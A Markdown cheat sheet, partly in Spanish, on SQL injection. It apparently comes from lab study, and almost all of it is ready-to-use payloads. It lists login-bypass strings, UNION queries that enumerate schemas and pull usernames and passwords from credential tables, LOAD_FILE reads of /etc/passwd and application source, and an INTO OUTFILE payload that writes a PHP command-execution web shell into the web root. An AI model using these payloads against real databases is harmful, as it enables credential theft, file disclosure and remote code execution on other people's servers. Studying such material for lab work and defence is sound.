# SLQi


## Tipos de inyecciones SQL

- In-Band
    - Union Based
    - Error Based
  
- Blind
  - Boolean Based
  - Time Based

- Out-of-band


## Payloads

| Payload | Url Encoded |
|:--------|:--------|
| '         | %27   |
| "         | %22   |
| #         | %23   |
| ;         | %3B   |
| )         | %29   |

admin' or '1'=='1'-- -


## OR Injection

```cmd
admin' or '1'='1

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

## Comments

```cmd
admin'--

SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

```
 admin')--

SELECT * FROM logins where (username='admin')-- and id>1) and .... 
```

## Union

```
SELECT * FROM products WHERE product_id = 'user_input'

SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '

SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords

... UNION SELECT username, 2, 3, 4 from passwords-- '


```

Nota: regresa username y password asumiendo que products tiene dos columnas.

## Union Injection 

### Detectar número de columnas

```cmd
' order by 4-- -
```

```cmd
cn' UNION select 1,2,3,4-- -
```

## Enumerate Database

### Database version

| payload           | Salida esperada            | Salida en otro dbms |
|:------------------|:---------------------------|:----------------|
| SELECT @@version  | regresa la versión de sql  | error |
| SELECT POW(1,1)   | 1   | error 
| SELECT SLEEP(5)   | retarda la respuesta 5 segundos y regresa 0 | sin delay
|

### Informaton_schema Database

Esta base de datos contiene los metadatos acerca las bases de datos y tablas presentes en el servidor.

- schemata

Información de las tablas en el sistema

```
select schema_name from information_schema.schemata

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
```

- Tablas

```cmd
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- Columnas

```cmd
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

- Datos

```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
cn' UNION select 1, username, password, 4 from ilfreight.users-- -
```


## Reading Files

```
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## Write Files

- verificar si tenemos permiso de escritura
  
```cmd
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

